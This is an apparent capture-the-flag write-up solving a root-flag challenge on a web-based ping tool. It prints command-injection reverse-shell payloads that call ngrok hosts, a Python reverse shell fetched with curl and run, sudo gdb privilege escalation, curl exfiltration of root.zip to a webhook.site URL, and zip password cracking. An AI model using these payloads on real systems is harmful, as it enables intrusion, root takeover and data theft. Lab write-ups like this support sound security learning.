# Pong (root flag) (500p)
## Challenge Description  

<em> If you successfully uncovered the hidden vulnerability in the web-based ping tool and retrieved the initial flag, your mission isn't over yet. The evil AI Wintermute has left decoy flags and removed the root-flag to mislead you. Your next objective is to find the root flag and finally defeat Wintermute to save the summer.

Author: Mikael Svall  
https://ping.appsec.nu/ </em>

## Thought Process
1. Initially I tried getting a reverse shell directly in the input, with commands like:
	- `|nc${IFS}-e${IFS}/bin/sh${IFS}2.tcp.eu.ngrok.io${IFS}15137`
	- `|bash${IFS}-c${IFS}"bash${IFS}-i${IFS}>&${IFS}/dev/tcp/2.tcp.eu.ngrok.io/15137${IFS}0>&1"`
None of my attempts worked however so I had to figure out another way.
2. It's important to check which binaries even exist on the server, that way you don't try in vain to make a solution work which would never work to begin with. For this I used `|which${IFS}*program_name*`. `nc` for example doesn't exist, so any reverse shells based on this binary would never work. Crucial to my progress was finding out that both `python` and `curl` exists.

## Solution
### Ngrok
"Ngrok is a cross-platform application that creates secure tunnels (paths) to localhost machine. It enables developers to expose a local development server to the Internet with minimal effort. The software makes your locally-hosted web server (like computer, laptop, rasbery PI) appear to be hosted on a subdomain of ngrok.com, meaning that no public IP or domain name on the local machine is needed."

I have configured my ngrok client to do the following:
```
Forwarding                    https://0246-194-0-227-191.ngrok-free.app -> http://localhost:8000 
Forwarding                    tcp://2.tcp.eu.ngrok.io:17271 -> localhost:4545
```
- The first line means that when I serve http on localhost port 8000, for example with `python -m http.server 8000`, that content is also publicly accessible through `https://0246-194-0-227-191.ngrok-free.app`.
- The second line means that when I listen for incoming TCP connections on localhost port 4545, for example with `nc -lvp 4545`, I am also listening on tcp address `2.tcp.eu.ngrok.io` on port `17271`.  
This comes in handy for solving the challenge!  

I bet it's easier to solve this challenge if you use the listener given to you through the Listener challenge, as that machine is presumably in the same network as the Ping server, meaning you can forget about all the port forwarding.

### Solution Steps
1. Create a file with your python reverse shell on your local machine. I name it `dependencies.sh`, and it contains the following code (it's probably still there on the server):
`export RHOST="0.tcp.eu.ngrok.io";export RPORT=11786;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`.  
`RHOST` is my publicly accessible tcp address while `RPORT` is the associated port. I have configured Ngrok so these map to address `127.0.0.1` and port `4545` respectively.
2. Serve your `dependencies.sh` file on your local machine, in my case `python -m http.server 8000`. Now we can upload the file to the server: `|curl${IFS}https://13bb-194-0-227-191.ngrok-free.app/dependencies.sh${IFS}--output${IFS}dependencies.sh`.
3. I verify that it exists on the server and then set execute permissions on it: `|chmod${IFS}+x${IFS}dependencies.sh`
4. I start my listener on my machine to catch the reverse shell: `nc -lvp 4545`
5. I execute the script on the server: `|bash${IFS}dependencies.sh`
6. Boom, we're in. Now time for privilege escalation. The first thing you should probably do is check if any users are allowed to run programs as another user, preferrably root. Check with `sudo -l`. We see that we can run `gdb` as root. We immediately head over to [gtfobins](https://gtfobins.github.io/#) to check if we can do any shennanigans with the `gdb` binary.
7. We can indeed use `gdb` to get root, as gtfobins suggests: `sudo gdb -nx -ex '!sh' -ex quit`
8. We head over to `/root` and see a `flag.txt`, but this flag has been compromised. We also see a `root.zip`, perhaps this contains the flag? We try `unzip root.zip` but this binary does not exists on the server. Let's just transfer it to our machine and unzip it there. We send it to our webhook proxy: `curl -F data=@root.zip https://webhook.site/4584b408-34fa-4386-908a-23864e23c647`. We can then download it from webhook to our machine.
9. Turns out the .zip file is password protected, let's use a wordlist attack with rockyou.txt: `fcrackzip root.zip -u -D -p rockyou.txt`. You could also run `zip2john` on the file and use `john` to crack it. In this file lies the flag! 
